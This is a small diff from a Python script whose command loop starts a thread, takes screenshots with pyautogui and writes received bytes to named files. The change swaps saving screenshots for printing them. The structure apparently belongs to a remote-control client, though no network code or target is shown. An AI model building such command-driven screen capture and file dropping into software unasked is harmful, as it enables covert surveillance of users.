@@ -31,8 +31,8 @@ try:
         elif data == "2" and not th.is_alive():
             th.start()
         elif data == "3":
-            pyautogui.screenshot().save("Screenshot"+str(screeniecounter) + ".png")
-            screeniecounter = screeniecounter + 1
+            print(pyautogui.screenshot())
+            pyautogui.screenshot()
         elif "img" in data:
             with open(data.split(" ")[1],"wb") as file:
                 file.write(byt)
